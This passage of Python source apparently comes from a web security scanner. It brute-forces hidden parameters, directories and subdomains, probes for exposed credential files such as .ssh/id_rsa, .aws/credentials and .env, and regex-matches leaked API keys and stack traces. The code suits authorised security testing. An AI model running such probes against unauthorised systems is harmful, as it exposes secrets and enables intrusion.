        "ticket","voucher","coupon","promo","discount","price","amount","qty",
        "quantity","total","tax","fee","charge","credit","balance","points",
        "hash","sig","signature","nonce","state","code_challenge","csrf_token",
        "utm_source","utm_medium","utm_campaign","ref_id","aff_id","partner",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def discover(self, url: str, console) -> List[str]:
        """Returns list of discovered parameter names."""
        found = []
        parsed = urllib.parse.urlparse(url)
        base   = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", ""))

        console.print(f"[dim]  Testing {len(self._WORDLIST)} parameters on {base}...[/dim]")

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True, timeout=8
        ) as client:
            try:
                baseline = await client.get(url or base)
                bl_len   = len(baseline.text)
                bl_status= baseline.status_code
            except Exception:
                return found

            sem = asyncio.Semaphore(self.config.concurrency)

            async def probe(param):
                async with sem:
                    try:
                        tu = f"{base}?{param}=y2s_probe_test"
                        r  = await client.get(tu, timeout=8)
                        diff = abs(len(r.text) - bl_len)
                        if r.status_code != bl_status or diff > 150:
                            found.append(param)
                        await asyncio.sleep(self.config.req_delay)
                    except Exception:
                        pass

            await asyncio.gather(*[probe(p) for p in self._WORDLIST])

        if found:
            console.print(f"[green]  ✓ Discovered {len(found)} parameter(s): {', '.join(found[:10])}{'...' if len(found) > 10 else ''}[/green]")
        else:
            console.print("[dim]  No hidden parameters discovered.[/dim]")
        return found


# ══════════════════════════════════════════════════════════════════════════════
#  DIRECTORY BRUTE FORCE
# ══════════════════════════════════════════════════════════════════════════════
class DirBruter:
    """
    Fast async directory/file brute forcer.
    Reports: status code, size, redirect target.
    """

    _WORDLIST = [
        "admin","administrator","login","panel","dashboard","manager","control",
        "api","api/v1","api/v2","v1","v2","graphql","rest","ws",
        "backup","backups","bak","old","archive","archives","temp","tmp",
        "test","debug","dev","development","staging","prod","production",
        "uploads","upload","files","file","media","images","img","assets","static",
        "docs","doc","documentation","help","support","faq","wiki",
        "config","configuration","settings","setup","install","installer",
        "phpinfo.php","info.php","test.php","shell.php","cmd.php","eval.php",
        ".git",".svn",".env",".env.local",".env.backup",".htaccess",".htpasswd",
        "web.config","wp-config.php","wp-login.php","wp-admin","xmlrpc.php",
        "phpmyadmin","adminer.php","dbadmin","mysql","database",
        "robots.txt","sitemap.xml","crossdomain.xml","security.txt","humans.txt",
        "swagger","swagger.json","swagger.yaml","api-docs","openapi.json",
        "health","healthz","ping","status","metrics","actuator",
        "console","h2-console","rails/info","telescope","horizon",
        "user","users","account","accounts","profile","register","signup","logout",
        "forgot","reset","verify","activate","oauth","auth","token","refresh",
        "search","cart","checkout","orders","products","shop","store",
        "export","import","download","report","reports","logs","log",
        "cron","cgi-bin","scripts","bin","proc",
    ]

    # Extensions to try for files
    _EXTENSIONS = ["", ".php", ".html", ".htm", ".asp", ".aspx", ".jsp", ".txt", ".bak", ".zip"]

    def __init__(self, config: Config):
        self.config = config

    async def brute(self, url: str, console,
                    extensions: bool = True,
                    status_filter: Optional[List[int]] = None) -> List[dict]:
        """
        Returns list of {path, status, size, redirect}.
        status_filter: only include these status codes (default: all interesting).
        """
        if status_filter is None:
            status_filter = [200, 201, 204, 301, 302, 307, 401, 403, 405, 500]

        parsed   = urllib.parse.urlparse(url)
        base     = f"{parsed.scheme}://{parsed.netloc}"
        found    = []
        sem      = asyncio.Semaphore(self.config.concurrency)

        wordlist = self._WORDLIST.copy()
        if extensions:
            expanded = []
            for w in wordlist[:40]:  # only try extensions on shorter list
                for ext in self._EXTENSIONS:
                    expanded.append(w + ext)
            wordlist = expanded + wordlist[40:]

        console.print(f"[dim]  Brute-forcing {len(wordlist)} paths on {base}...[/dim]")

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=False, timeout=8
        ) as client:
            async def probe(path):
                async with sem:
                    target = f"{base}/{path.lstrip('/')}"
                    try:
                        r = await client.get(target, timeout=8)
                        if r.status_code in status_filter:
                            redirect = r.headers.get("location", "")
                            found.append({
                                "path":     f"/{path}",
                                "status":   r.status_code,
                                "size":     len(r.content),
                                "redirect": redirect,
                            })
                        await asyncio.sleep(self.config.req_delay)
                    except Exception:
                        pass

            await asyncio.gather(*[probe(p) for p in wordlist], return_exceptions=True)

        found.sort(key=lambda x: (x["status"], -x["size"]))
        return found


# ══════════════════════════════════════════════════════════════════════════════
#  SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════════════════════════════
class SubdomainEnum:
    """
    DNS-based subdomain enumeration with HTTP verification.
    """

    _WORDLIST = [
        "www","mail","ftp","admin","api","dev","staging","test","beta","app",
        "portal","dashboard","panel","console","manage","manager","management",
        "auth","login","sso","oauth","id","accounts","account","user","users",
        "shop","store","cart","pay","payment","checkout","billing","invoice",
        "static","assets","cdn","img","images","media","files","upload","uploads",
        "docs","doc","help","support","kb","wiki","forum","community","blog",
        "news","status","monitoring","monitor","metrics","grafana","kibana",
        "vpn","remote","rdp","ssh","bastion","jump","gw","gateway",
        "smtp","imap","pop","mx","webmail","email","mail2",
        "api2","api3","v1","v2","internal","private","intranet","corp",
        "git","gitlab","github","bitbucket","svn","jenkins","ci","cd",
        "jira","confluence","redmine","trello","slack","zoom",
        "db","database","mysql","postgres","mongo","redis","elastic",
        "search","ws","websocket","socket","stream","live","chat",
        "uat","qa","sandbox","demo","preview","canary",
        "old","legacy","backup","archive","vault","secure","ssl",
        "m","mobile","wap","app2","apps","go","io","cloud",
    ]

    def __init__(self, config: Config, console):
        self.config  = config
        self.console = console

    async def enumerate(self, domain: str) -> List[dict]:
        """
        Returns list of {subdomain, ip, status, title}.
        """
        import socket
        found = []
        sem   = asyncio.Semaphore(self.config.concurrency)
        self.console.print(f"[dim]  Enumerating {len(self._WORDLIST)} subdomains of {domain}...[/dim]")

        async def probe(sub):
            async with sem:
                fqdn = f"{sub}.{domain}"
                try:
                    # DNS resolve
                    loop = asyncio.get_event_loop()
                    ip = await loop.run_in_executor(None, socket.gethostbyname, fqdn)
                except Exception:
                    return  # NXDOMAIN

                # HTTP verify
                for scheme in ("https", "http"):
                    try:
                        async with httpx.AsyncClient(
                            verify=False, follow_redirects=True, timeout=6,
                            headers=random_headers()
                        ) as cl:
                            r = await cl.get(f"{scheme}://{fqdn}", timeout=6)
                            title = ""
                            m     = re.search(r'<title[^>]*>([^<]+)</title>', r.text, re.IGNORECASE)
                            if m:
                                title = m.group(1).strip()[:60]
                            found.append({
                                "subdomain": fqdn,
                                "ip":        ip,
                                "status":    r.status_code,
                                "title":     title,
                                "scheme":    scheme,
                            })
                            return
                    except Exception:
                        continue

                # Resolved DNS but no HTTP — still interesting
                found.append({
                    "subdomain": fqdn,
                    "ip":        ip,
                    "status":    0,
                    "title":     "(no HTTP response)",
                    "scheme":    "dns-only",
                })
                await asyncio.sleep(self.config.req_delay)

        await asyncio.gather(*[probe(s) for s in self._WORDLIST], return_exceptions=True)
        found.sort(key=lambda x: x["status"], reverse=True)
        return found


# ══════════════════════════════════════════════════════════════════════════════
#  MODE 62 — PARAM DISCOVERY + SUBDIR ENUM + INFORMATION DISCLOSURE
# ══════════════════════════════════════════════════════════════════════════════

class ReconAndDisclosureScanner:
    """
    Combined recon + information disclosure module (Mode 62).

    Three parallel tasks:
      1. Parameter Discovery   — finds hidden/undocumented GET/POST params
      2. Subdirectory Enum     — enumerates dirs/files including sensitive ones
      3. Information Disclosure — detects exposed secrets, headers, debug info,
                                   API keys in JS, internal paths, stack traces,
                                   source maps, cloud credentials, and more.
    """

    # ── Extended parameter wordlist ──────────────────────────────────────────
    _PARAM_WORDLIST = [
        # Core / injection targets
        "id","user","username","email","pass","password","token","key","api_key",
        "secret","auth","session","debug","admin","test","page","limit","offset",
        "sort","order","filter","q","query","search","file","path","url","src",
        "redirect","next","return","callback","ref","type","action","method",
        "lang","locale","format","output","view","template","theme","module",
        "plugin","config","data","payload","cmd","exec","code","script",
        "include","load","fetch","get","post","put","delete","update","create",
        "read","write","upload","download","export","import","backup","restore",
        "log","trace","verbose","version","mode","env","environment","host",
        "port","ip","address","domain","site","feed","rss","xml","json","csv",
        "pdf","doc","report","result","response","status","error","msg",
        "message","notification","alert","warn","info","success","fail",
        "access","role","group","perm","privilege","scope","grant","claim",
        "ticket","voucher","coupon","promo","discount","price","amount","qty",
        "quantity","total","tax","fee","charge","credit","balance","points",
        "hash","sig","signature","nonce","state","code_challenge","csrf_token",
        "utm_source","utm_medium","utm_campaign","ref_id","aff_id","partner",
        # IDOR / object references
        "user_id","account_id","order_id","product_id","item_id","doc_id",
        "file_id","image_id","record_id","entry_id","post_id","comment_id",
        "customer_id","client_id","invoice_id","ticket_id","request_id",
        # Auth / JWT
        "access_token","refresh_token","id_token","bearer","jwt","api_token",
        "auth_token","session_token","login_token","reset_token","verify_token",
        "otp","pin","mfa_code","totp","2fa","code","grant_type","client_secret",
        # Open redirect / SSRF
        "redirect_uri","redirect_url","return_url","next_url","continue",
        "target","goto","destination","location","forward","proxy","endpoint",
        "webhook","notify","ping","callback_url","after_login","success_url",
        "cancel_url","error_url","origin","referrer","base_url","service",
        # LFI / path traversal
        "template","theme","layout","skin","lang_file","page_file","view_file",
        "inc","include_file","require","partial","section","component",
        # Debugging / internal
        "debug","verbose","trace","log_level","logging","dev","develop",
        "development","testing","internal","hidden","show","display","render",
        "preview","draft","raw","plain","full","expand","detail","schema",
        # Pagination
        "page","page_num","pagenum","current_page","pg","p","start","begin",
        "from","to","end","skip","take","top","rows","per_page","page_size",
        # Search / filter
        "search","keyword","term","phrase","q","s","find","lookup","match",
        "like","where","having","group","field","column","table","db","database",
        # Upload / file ops
        "file","filename","name","attachment","upload","image","photo","avatar",
        "document","media","content","body","text","html","markup","source",
        # API / versioning
        "version","v","api_version","schema_version","format","encoding","pretty",
        "indent","wrap","envelope","callback","jsonp","fields","include","exclude",
        # Timestamps / dates
        "date","from_date","to_date","start_date","end_date","created_at",
        "updated_at","timestamp","since","until","before","after","period",
        # Misc sensitive
        "ssn","dob","birth_date","phone","mobile","address","zip","postal",
        "country","city","state","region","currency","amount","card","cvv",
        "expiry","iban","account_number","routing_number",
    ]

    # ── Extended subdirectory wordlist ────────────────────────────────────────
    _DIR_WORDLIST = [
        # Admin / control panels
        "admin","administrator","admin/login","admin/dashboard","admin/users",
        "panel","cpanel","webpanel","control","manager","management","manage",
        "dashboard","console","portal","backend","superadmin","root",
        # API endpoints
        "api","api/v1","api/v2","api/v3","api/v4","api/latest","api/public",
        "api/private","api/internal","api/admin","api/user","api/users",
        "api/auth","api/login","api/register","api/token","api/refresh",
        "api/health","api/status","api/version","api/config","api/debug",
        "api/search","api/upload","api/files","api/export","api/import",
        "graphql","graphql/","api/graphql","graphiql","playground",
        "swagger","swagger.json","swagger.yaml","swagger-ui","swagger-ui.html",
        "api-docs","openapi.json","openapi.yaml","redoc","spec",
        # Sensitive / debug files
        ".env",".env.local",".env.dev",".env.development",".env.staging",
        ".env.production",".env.backup",".env.old",".env.bak",".env.example",
        ".git",".git/config",".git/HEAD",".git/COMMIT_EDITMSG",".git/index",
        ".git/logs/HEAD",".git/refs/heads/main",".git/refs/heads/master",
        ".svn",".svn/entries",".hg",".hg/hgrc",
        ".htaccess",".htpasswd",".bash_history",".bash_profile",".bashrc",
        ".ssh/id_rsa",".ssh/id_rsa.pub",".ssh/authorized_keys",".ssh/known_hosts",
        ".aws/credentials",".aws/config",".npmrc",".pypirc",
        "web.config","applicationHost.config","machine.config",
        "config.php","config.inc.php","configuration.php","settings.php",
        "wp-config.php","wp-config.php.bak","wp-config.php.old",
        "database.yml","database.php","db.php","db_config.php","connection.php",
        "application.properties","application.yml","application.yaml",
        "appsettings.json","appsettings.Development.json",
        "secrets.yml","secrets.json","credentials.json","credentials.yml",
        "config.json","config.yml","config.yaml","config.xml","config.ini",
        "settings.json","settings.yml","local.json","local.yml",
        # PHP info / debug
        "phpinfo.php","info.php","php_info.php","phpinfo","test.php",
        "debug.php","shell.php","cmd.php","eval.php","r.php","c.php",
        "admin.php","login.php","panel.php","upload.php","file.php",
        # Backup / archive files
        "backup","backups","backup.zip","backup.tar.gz","backup.sql",
        "database.sql","db.sql","dump.sql","backup.sql.gz","data.sql",
        "site.zip","site.tar.gz","website.zip","archive.zip","files.zip",
        "old","archive","temp","tmp","cache","bak",
        "index.php.bak","index.php.old","index.bak","index.html.bak",
        # Logs
        "logs","log","error_log","access_log","error.log","access.log",
        "debug.log","app.log","application.log","server.log","php_error.log",
        "laravel.log","django.log","rails.log","node.log",
        # Dev / CI / infra
        "dev","develop","development","staging","uat","qa","test","sandbox",
        ".travis.yml","Dockerfile","docker-compose.yml","Makefile","Vagrantfile",
        "Jenkinsfile",".circleci/config.yml",".github/workflows",
        "deploy.sh","build.sh","setup.sh","install.sh","run.sh",
        # Monitoring / health
        "health","healthz","health/check","health/live","health/ready",
        "ping","status","alive","ready","metrics","actuator","actuator/env",
        "actuator/beans","actuator/health","actuator/info","actuator/loggers",
        "actuator/mappings","actuator/threaddump","actuator/heapdump",
        # CMS / frameworks
        "wp-login.php","wp-admin","wp-admin/admin-ajax.php","xmlrpc.php",
        "wp-content/debug.log","wp-content/uploads","wp-json",
        "joomla","administrator","components","modules","plugins","templates",
        "drupal","sites/default/files","sites/default/settings.php",
        "rails/info","rails/info/properties","telescope","horizon","nova",
        "h2-console","console","spring-boot","actuator",
        "phpmyadmin","pma","adminer.php","dbadmin","db","mysql","database",
        # Source maps / JS
        "app.js.map","main.js.map","bundle.js.map","vendor.js.map",
        "chunk.js.map","index.js.map","static/js/main.chunk.js.map",
        # Security / auth
        ".well-known/openid-configuration",".well-known/jwks.json",
        ".well-known/security.txt","security.txt","security",
        "auth","oauth","sso","saml","cas","ldap","kerberos",
        # Misc interesting
        "robots.txt","sitemap.xml","sitemap_index.xml","crossdomain.xml",
        "humans.txt","ads.txt","security.txt","browserconfig.xml",
        "package.json","composer.json","requirements.txt","Gemfile",
        "yarn.lock","package-lock.json","Pipfile","Pipfile.lock",
        "README.md","README.txt","CHANGELOG.md","TODO.md","INSTALL.md",
        ".DS_Store","Thumbs.db","desktop.ini",
    ]

    # ── Extensions to bruteforce on select paths ──────────────────────────────
    _EXTENSIONS = [
        "", ".php", ".html", ".htm", ".asp", ".aspx", ".jsp", ".py",
        ".rb", ".bak", ".old", ".txt", ".zip", ".tar.gz", ".sql",
        ".json", ".xml", ".log", ".backup", ".swp", "~",
    ]

    # ── Sensitive file signatures ─────────────────────────────────────────────
    _SENSITIVE_SIGNATURES = [
        # Cloud / API keys
        (r"AKIA[0-9A-Z]{16}",                                "AWS Access Key ID"),
        (r"(?:aws_secret|AWS_SECRET)[_\s]*[=:]\s*[A-Za-z0-9/+=]{40}","AWS Secret Key"),
        (r"AIza[0-9A-Za-z\-_]{35}",                          "Google API Key"),
        (r"ya29\.[0-9A-Za-z\-_]+",                           "Google OAuth Token"),
        (r"ghp_[0-9A-Za-z]{36}",                             "GitHub Personal Access Token"),
        (r"github_pat_[0-9A-Za-z_]{82}",                     "GitHub Fine-Grained PAT"),
        (r"ghs_[0-9A-Za-z]{36}",                             "GitHub Actions Token"),
        (r"sk-[A-Za-z0-9]{48}",                              "OpenAI API Key"),
        (r"xox[baprs]-[0-9A-Za-z\-]+",                       "Slack Token"),
        (r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",    "SendGrid API Key"),
        (r"(?:TWILIO_|twilio_)[A-Z_]*TOKEN[_\s]*[=:]\s*[A-Za-z0-9]+","Twilio Token"),
        (r"stripe_(?:live|test)_[A-Za-z0-9_]+",             "Stripe Key"),
        (r"pk_(?:live|test)_[A-Za-z0-9]{24,}",              "Stripe Publishable Key"),
        (r"sk_(?:live|test)_[A-Za-z0-9]{24,}",              "Stripe Secret Key"),
        (r"Bearer\s+[A-Za-z0-9\-_\.]+\.[A-Za-z0-9\-_\.]+\.[A-Za-z0-9\-_\.]+","Bearer JWT Token"),
        (r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+","Raw JWT Token"),
        # Credentials in config files
        (r"(?:password|passwd|pass|pwd)\s*[=:]\s*['\"]?(?![\*x]+)[^\s'\"]{6,}","Hardcoded Password"),
        (r"(?:secret_key|SECRET_KEY)\s*[=:]\s*['\"]?[A-Za-z0-9_\-\.]{12,}","Secret Key"),
        (r"(?:database_url|DATABASE_URL)\s*[=:]\s*['\"]?[a-z]+://[^\s'\"]+","Database URL"),
        (r"(?:mongodb://|mongodb\+srv://)[^\s'\"]+",         "MongoDB Connection String"),
        (r"(?:postgres|postgresql|mysql|mariadb|mssql)://[^\s'\"]+","DB Connection String"),
        (r"(?:redis://|rediss://)[^\s'\"]+",                 "Redis Connection String"),
        # Private keys
        (r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----","Private Key"),
        (r"-----BEGIN CERTIFICATE-----",                      "TLS Certificate"),
        # Internal paths / info
        (r"/home/[a-z_][a-z0-9_\-]{1,31}/",                 "Internal Home Path"),
        (r"(?:C:|D:)\\(?:Users|Windows|Program Files)\\",   "Windows Internal Path"),
        (r"(?:/var/www|/srv/www|/opt/[a-z])",                "Internal Web Root Path"),
        # Debug / stack trace markers
        (r"Traceback \(most recent call last\)",              "Python Stack Trace"),
        (r"at [A-Za-z$_][A-Za-z0-9$_.]*\s*\([^)]+\.(?:js|ts):\d+:\d+\)","JS Stack Trace"),
        (r"(?:NullPointerException|StackOverflowError|ClassNotFoundException)","Java Exception"),
        (r"System\.Web\.HttpException",                       "ASP.NET Exception"),
        (r"ActiveRecord::[A-Za-z]+Error",                     "Rails ActiveRecord Error"),
        (r"django\.core\.exceptions\.[A-Za-z]+",             "Django Exception"),
        # Version info
        (r"(?:Apache|nginx|IIS|Tomcat|Jetty|LiteSpeed)[\s/][\d\.]+","Web Server Version"),
        (r"PHP/[\d\.]+",                                      "PHP Version"),
        (r"Ruby[\s/][\d\.]+",                                 "Ruby Version"),
        (r"Python[\s/][\d\.]+",                               "Python Version"),
        (r"WordPress[\s/][\d\.]+",                            "WordPress Version"),
        (r"Drupal[\s/][\d\.]+",                               "Drupal Version"),
        # Email addresses (internal)
        (r"[a-z0-9._%+\-]+@(?:internal|corp|local|private|intra)\.[a-z]{2,}","Internal Email"),
    ]

    # ── HTTP response headers that reveal sensitive info ──────────────────────
    _DISCLOSURE_HEADERS = [
        "Server","X-Powered-By","X-AspNet-Version","X-AspNetMvc-Version",
        "X-Generator","X-Drupal-Cache","X-WordPress-Cache","X-Pingback",
        "X-Runtime","X-Version","X-App-Version","X-API-Version",
        "X-Backend-Server","X-Upstream","X-Host","X-Real-IP",
        "X-Forwarded-Host","Via","X-Node","X-Rack-Cache","X-Varnish",
        "X-Served-By","X-Cache-Hits","CF-Cache-Status","X-Debug-Token",
        "X-Debug-Token-Link","X-SymfonyProfiler","X-Debug-Info",
    ]

    # ── Debug / disclosure GET params ─────────────────────────────────────────
    _DEBUG_PARAMS = [
        ("debug",   "1"),   ("debug",   "true"),  ("debug",   "on"),
        ("verbose", "1"),   ("verbose", "true"),  ("trace",   "1"),
        ("test",    "1"),   ("dev",     "1"),     ("admin",   "1"),
        ("internal","1"),   ("secret",  "1"),     ("raw",     "1"),
        ("json",    "1"),   ("xml",     "1"),     ("plain",   "1"),
        ("format",  "json"),("format",  "xml"),   ("pretty",  "1"),
        ("show",    "all"), ("full",    "1"),      ("expand",  "1"),
        ("phpinfo", "1"),   ("env",     "1"),     ("config",  "1"),
        ("XDEBUG_SESSION_START","PHPSTORM"),
    ]

    def __init__(self, config: Config, console):
        self.config  = config
        self.console = console

    # ── TASK 1: Parameter Discovery ──────────────────────────────────────────

    async def _discover_params(self, client: httpx.AsyncClient,
                                url: str) -> dict:
        """
        Finds hidden parameters via:
          a) Wordlist probe: single param per request, compare vs baseline
          b) JS/HTML extraction: scrape page for param names used in scripts
          c) POST body: same wordlist via POST to detect backend-only params
        """
        results = {
            "url":        url,
            "get_params": [],
            "post_params":[],
            "js_params":  [],
        }
        parsed = urllib.parse.urlparse(url)
        base   = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", ""))

        # Baseline
        try:
            bl = await client.get(url, timeout=10, follow_redirects=True)
            bl_len, bl_status = len(bl.text), bl.status_code
        except Exception:
            return results

        # ── a) GET param probing ──────────────────────────────────────────────
        sem = asyncio.Semaphore(self.config.concurrency)

        async def probe_get(param):
            async with sem:
                try:
                    tu = f"{base}?{urllib.parse.urlencode({param: 'y2s_recon_1'})}"
                    r  = await client.get(tu, timeout=8, follow_redirects=True)
                    diff = abs(len(r.text) - bl_len)
                    # Signal: status changed OR size changed significantly OR new redirect
                    if r.status_code != bl_status or diff > 200:
                        results["get_params"].append({
                            "name":   param,
                            "signal": f"status {bl_status}→{r.status_code}, size Δ{diff}B",
                        })
                    await asyncio.sleep(self.config.req_delay)
                except Exception:
                    pass

        await asyncio.gather(*[probe_get(p) for p in self._PARAM_WORDLIST])

        # ── b) POST body probing ──────────────────────────────────────────────
        try:
            bl_post = await client.post(base, data={"y2s_sentinel": "1"},
                                        timeout=10, follow_redirects=True)
            bl_post_len = len(bl_post.text)
        except Exception:
            bl_post_len = bl_len

        async def probe_post(param):
            async with sem:
                try:
                    r = await client.post(base,
                                          data={param: "y2s_recon_1"},
                                          timeout=8, follow_redirects=True)
                    diff = abs(len(r.text) - bl_post_len)
                    if r.status_code not in (405, 404) and diff > 200:
                        results["post_params"].append({
                            "name":   param,
                            "signal": f"POST status {r.status_code}, size Δ{diff}B",
                        })
                    await asyncio.sleep(self.config.req_delay)
                except Exception:
                    pass

        await asyncio.gather(*[probe_post(p) for p in self._PARAM_WORDLIST[:80]])

        # ── c) Extract params from HTML/JS sources ────────────────────────────
        try:
            body = bl.text
            # HTML input/select/textarea names
            html_names = set(re.findall(
                r'(?:name|id)=["\']([a-zA-Z_][a-zA-Z0-9_\-]{1,40})["\']', body))
            # JS: fetch/axios calls with query params
            js_names = set(re.findall(
                r'[\?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', body))
            # JS object keys likely used as params
            js_keys = set(re.findall(
                r'["\']([a-zA-Z_][a-zA-Z0-9_]{2,25})["\']:\s*(?:true|false|null|\d+|["\'])',
                body))
            combined = (html_names | js_names | js_keys) - set(self._PARAM_WORDLIST)
            results["js_params"] = sorted(combined)[:60]
        except Exception:
            pass

        return results

    # ── TASK 2: Subdirectory / File Enumeration ───────────────────────────────

    async def _enum_dirs(self, client: httpx.AsyncClient,
                          url: str) -> List[dict]:
        """
        Probes the full _DIR_WORDLIST with smart extension expansion.
        Returns list of findings sorted by interest (status code, size).
        """
        parsed = urllib.parse.urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        found  = []
        sem    = asyncio.Semaphore(self.config.concurrency)

        # Build probe list: wordlist + extension expansion on likely-file entries
        _file_stems = [w for w in self._DIR_WORDLIST
                       if "." not in w and len(w) < 20][:30]
        _extra_ext  = []
        for stem in _file_stems:
            for ext in self._EXTENSIONS[1:]:  # skip ""
                _extra_ext.append(stem + ext)

        full_list = list(dict.fromkeys(self._DIR_WORDLIST + _extra_ext))

        async def probe(path):
            async with sem:
                target = f"{base}/{path.lstrip('/')}"
                try:
                    r = await client.get(target, timeout=8,
                                         follow_redirects=False)
                    if r.status_code in (200, 201, 204, 301, 302,
                                         307, 401, 403, 405, 500, 503):
                        redirect = r.headers.get("location", "")
                        content_type = r.headers.get("content-type", "")
                        snippet = r.text[:300].strip().replace("\n", " ")
                        # Classify sensitivity
                        severity = "INFO"
                        reason   = ""
                        path_lower = path.lower()
                        if any(s in path_lower for s in [
                            ".env", ".git", "config", "secret", "password",
                            "credential", "backup", ".sql", ".bak", ".log",
                            "phpinfo", "adminer", "phpmyadmin", ".ssh",
                            ".aws", "id_rsa", "web.config", "wp-config",
                        ]):
                            severity = "HIGH"
                            reason   = "Sensitive file/path"
                        elif r.status_code == 200 and any(s in path_lower for s in [
                            "admin","panel","dashboard","console","manage",
                            "debug","test","actuator","swagger","api-docs",
                            "graphiql","h2-console","telescope","horizon",
                        ]):
                            severity = "MEDIUM"
                            reason   = "Admin/debug interface"
                        elif r.status_code in (401, 403):
                            severity = "LOW"
                            reason   = "Forbidden — exists but blocked"

                        found.append({
                            "path":         f"/{path.lstrip('/')}",
                            "url":          target,
                            "status":       r.status_code,
                            "size":         len(r.content),
                            "content_type": content_type.split(";")[0].strip(),
                            "redirect":     redirect,
                            "snippet":      snippet[:120],
                            "severity":     severity,
                            "reason":       reason,
                        })
                    await asyncio.sleep(self.config.req_delay)
                except Exception:
                    pass

        await asyncio.gather(*[probe(p) for p in full_list],
                             return_exceptions=True)

        # Sort: HIGH first, then by status, then by size desc
        _sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
        found.sort(key=lambda x: (
            _sev_order.get(x["severity"], 4),
            x["status"],
            -x["size"],
        ))
        return found

    # ── TASK 3: Information Disclosure ────────────────────────────────────────

    async def _info_disclosure(self, client: httpx.AsyncClient,
                                url: str) -> List[dict]:
        """
        Checks for information disclosure via:
          - Response header analysis
          - Sensitive pattern matching in body (API keys, creds, stack traces)
          - robots.txt disallowed path extraction
          - Source map (.js.map) detection
          - Debug parameter probing
          - Error-triggered disclosure (malformed requests)
        """
        findings = []
        parsed   = urllib.parse.urlparse(url)
        base     = f"{parsed.scheme}://{parsed.netloc}"

        # ── a) Header analysis ────────────────────────────────────────────────
        try:
            r = await client.get(url, timeout=10, follow_redirects=True)
            for header in self._DISCLOSURE_HEADERS:
                val = r.headers.get(header)
                if val:
                    sev = "HIGH" if any(
                        x in header.lower() for x in ["debug", "token", "backend"]
                    ) else "LOW"
                    findings.append({
                        "type":     "Header Disclosure",
                        "severity": sev,
                        "location": f"HTTP Header: {header}",
                        "value":    val,
                        "detail":   f"Response header '{header}' leaks server info: {val}",
                    })

            # ── b) Body: sensitive pattern matching ───────────────────────────
            body = r.text
            for pattern, label in self._SENSITIVE_SIGNATURES:
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    # Mask secrets before reporting
                    sample = matches[0]
                    masked = sample[:8] + "****" + sample[-4:] if len(sample) > 16 else sample
                    sev    = ("CRITICAL" if any(x in label for x in [
                                "Private Key","AWS","Secret Key","Token",
                                "Password","Stripe","OpenAI",
                              ]) else
                              "HIGH" if any(x in label for x in [
                                "Stack Trace","Exception","DB Connection",
                                "MongoDB","Redis","JWT",
                              ]) else "MEDIUM")
                    findings.append({
                        "type":     "Information Disclosure",
                        "severity": sev,
                        "location": url,
                        "value":    masked,
                        "detail":   f"{label} detected in page response",
                    })
        except Exception:
            pass

        # ── c) robots.txt mining ──────────────────────────────────────────────
        try:
            r_robots = await client.get(f"{base}/robots.txt", timeout=8)
            if r_robots.status_code == 200 and "disallow" in r_robots.text.lower():
                disallowed = re.findall(
                    r'Disallow:\s*(/[^\s\r\n]+)', r_robots.text, re.IGNORECASE)
                if disallowed:
                    for dis_path in disallowed[:30]:
                        # Flag paths that look sensitive
                        if any(w in dis_path.lower() for w in [
                            "admin","secret","config","backup","private",
                            "internal","api","auth","debug","panel","manage",
                            "database","logs","upload","export","download",
                        ]):
                            findings.append({
                                "type":     "robots.txt Disclosure",
                                "severity": "MEDIUM",
                                "location": f"{base}/robots.txt",
                                "value":    dis_path,
                                "detail":   (f"robots.txt disallows '{dis_path}' — "
                                             "suggests a sensitive internal path"),
                            })
        except Exception:
            pass

        # ── d) Source map detection ───────────────────────────────────────────
        _js_map_candidates = []
        try:
            r_home = await client.get(url, timeout=10, follow_redirects=True)
            js_srcs = re.findall(
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                r_home.text, re.IGNORECASE)
            for js_src in js_srcs[:8]:
                if not js_src.startswith("http"):
                    js_src = base + "/" + js_src.lstrip("/")
                _js_map_candidates.append(js_src + ".map")
        except Exception:
            pass

        for map_url in _js_map_candidates:
            try:
                r_map = await client.get(map_url, timeout=7)
                if r_map.status_code == 200 and "mappings" in r_map.text:
                    # Extract source file names from the map
                    sources = re.findall(r'"sources"\s*:\s*\[([^\]]+)\]',
                                         r_map.text)
                    src_list = sources[0][:200] if sources else ""
                    findings.append({
                        "type":     "Source Map Exposed",
                        "severity": "HIGH",
                        "location": map_url,
                        "value":    src_list,
                        "detail":   ("JavaScript source map is publicly accessible — "
                                     "exposes original source file paths and potentially "
                                     "minified source code"),
                    })
            except Exception:
                pass

        # ── e) Debug parameter probing ────────────────────────────────────────
        try:
            bl_len = len((await client.get(url, timeout=8)).text)
        except Exception:
            bl_len = 0

        for param, val in self._DEBUG_PARAMS:
            try:
                tu = f"{url}{'&' if '?' in url else '?'}{param}={val}"
                r  = await client.get(tu, timeout=8, follow_redirects=True)
                body_d = r.text
                diff   = len(body_d) - bl_len
                # Look for debug-specific signals in the response
                debug_signals = [
                    "stack trace", "traceback", "exception", "debug",
                    "internal server error", "query took", "database",
                    "sql error", "syntax error", "line number",
                    "phpinfo", "php version", "server api", "loaded modules",
                ]
                matched = [s for s in debug_signals
                           if s in body_d.lower()
                           and s not in (
                               await client.get(url, timeout=8)
                           ).text.lower()]
                if matched or (diff > 500 and r.status_code == 200):
                    findings.append({
                        "type":     "Debug Parameter Disclosure",
                        "severity": "HIGH",
                        "location": tu,
                        "value":    f"?{param}={val}",
                        "detail":   (f"Adding '?{param}={val}' changed response by {diff}B "
                                     + (f"and revealed: {', '.join(matched)}" if matched else "")),
                    })
                    break  # one confirmed debug param is enough
            except Exception:
                continue

        # ── f) Error-triggered disclosure ─────────────────────────────────────
        _error_tests = [
            f"{url}{'&' if '?' in url else '?'}id=INVALID_CRASH_TEST_Y2S",
